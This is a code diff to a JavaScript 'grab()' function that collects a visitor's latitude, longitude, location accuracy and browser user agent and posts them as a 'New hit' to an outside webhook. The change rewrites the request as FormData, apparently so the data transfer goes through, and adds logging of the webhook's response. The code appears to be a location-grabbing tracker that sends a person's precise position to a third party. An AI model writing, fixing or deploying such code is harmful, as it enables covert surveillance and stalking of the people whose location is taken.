@@ -54,14 +54,16 @@ function grab() {
       log(`Map: ${maps}`);
 
       try {
+        const formData = new FormData();
+        formData.append("content", `📍 **New hit**\nLat: \`${lat}\`\nLon: \`${lon}\`\nAccuracy: ${acc}m\nMap: ${maps}\nUA: ${navigator.userAgent}`);
+
         const res = await fetch(WEBHOOK, {
           method: "POST",
-          headers: {"Content-Type":"application/json"},
-          body: JSON.stringify({
-            content: `📍 **New hit**\nLat: \`${lat}\`\nLon: \`${lon}\`\nAccuracy: ${acc}m\nMap: ${maps}\nUA: ${navigator.userAgent}`
-          })
+          body: formData
         });
         log("Webhook status: " + res.status);
+        const txt = await res.text();
+        if (txt) log("Response: " + txt.slice(0, 200));
       } catch(e) {
         log("Webhook failed: " + e.message);
       }
